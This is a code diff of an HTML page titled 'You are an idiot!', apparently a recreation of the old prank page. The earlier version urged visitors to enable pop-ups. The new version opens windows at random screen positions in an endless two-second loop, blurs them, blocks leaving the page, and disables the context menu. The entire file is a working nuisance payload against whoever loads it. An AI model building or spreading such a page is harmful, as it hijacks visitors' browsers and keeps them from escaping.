@@ -3,99 +3,62 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>You are an idiot</title>
+  <title>You are an idiot!</title>
   <style>
-    body {
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body { 
+      background: #000; 
       overflow: hidden;
-      background-color: black;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
+      width: 100vw;
       height: 100vh;
-      color: yellow;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      font-size: 3rem;
-      font-weight: bold;
-      animation: blink 0.5s infinite alternate;
     }
-    @keyframes blink {
-      from { opacity: 1; }
-      to { opacity: 0.3; }
-    }
-    #arrow {
-      display: none;
-      font-size: 5rem;
-      margin-bottom: 20px;
-      animation: shake 0.5s infinite alternate;
-    }
-    @keyframes shake {
-      0% { transform: translateX(-10px); }
-      100% { transform: translateX(10px); }
-    }
-    #message {
-      display: none;
-      font-size: 1.5rem;
-      margin-top: 20px;
-      color: white;
-    }
-    #idiot-message {
-      display: none;
-      margin-top: 20px;
+    video { 
+      width: 100%; 
+      height: 100%; 
+      object-fit: cover;
     }
   </style>
 </head>
 <body>
-  <div id="arrow">↗️</div>
-  <div id="message">Please enable pop-ups to continue</div>
-  <div id="idiot-message">You are an idiot!</div>
+  <video autoplay loop muted>
+    <source src="tu_video.mp4" type="video/mp4">
+  </video>
 
   <script>
-    // Function to check if pop-ups are blocked
-    function checkPopupBlocked() {
-      const testWindow = window.open('', '', 'width=1,height=1');
-      if (!testWindow || testWindow.closed) {
-        document.getElementById('arrow').style.display = 'block';  // Show the arrow if pop-ups are blocked
-        document.getElementById('message').style.display = 'block';  // Show the message to enable pop-ups
-
-        // Position the arrow to point where the user typically needs to enable pop-ups
-        document.getElementById('arrow').style.position = 'absolute';
-        document.getElementById('arrow').style.top = '10%';  // Position it near the top
-        document.getElementById('arrow').style.left = '50%'; // Center the arrow horizontally
-        document.getElementById('arrow').style.transform = 'translateX(-50%)'; // Adjust to center exactly
-      } else {
-        testWindow.close();  // Close the test window if pop-ups are allowed
-        document.getElementById('idiot-message').style.display = 'block'; // Show the "You are an idiot!" message
-        
-        // Hide the pop-up message and the arrow after pop-ups are enabled
-        document.getElementById('arrow').style.display = 'none';
-        document.getElementById('message').style.display = 'none';
-
-        setInterval(abrirMasVentanas, 2000); // Start opening multiple pop-ups every 2 seconds
+    function abrirVentana() {
+      const width = 400;
+      const height = 300;
+      const x = Math.floor(Math.random() * (screen.availWidth - width));
+      const y = Math.floor(Math.random() * (screen.availHeight - height));
+      
+      const nuevaVentana = window.open('popup.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
+      if (nuevaVentana) {
+        nuevaVentana.blur();
       }
     }
 
-    // Function to open more windows at random positions
-    function abrirMasVentanas() {
-      const ventanaAncho = 400;
-      const ventanaAlto = 300;
-
-      // Calculate a random position on the screen
-      const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - ventanaAncho));
-      const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - ventanaAlto));
-
-      // Open the new window at the random position
-      const win = window.open('popup.html', '_blank', `width=${ventanaAncho},height=${ventanaAlto},left=${nuevaX},top=${nuevaY}`);
-      if (win) {
-        win.blur();
+    setTimeout(() => {
+      for (let i = 0; i < 5; i++) {
+        setTimeout(() => abrirVentana(), i * 300);
       }
-    }
+    }, 1000);
 
-    // Check if pop-ups are blocked initially and every 5 seconds
-    checkPopupBlocked();
-    setInterval(checkPopupBlocked, 5000);  // Check again every 5 seconds
+    setInterval(() => abrirVentana(), 2000);
+
+    window.addEventListener('beforeunload', (e) => {
+      e.preventDefault();
+      e.returnValue = '';
+      return '';
+    });
+
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
   </script>
 </body>
 </html>
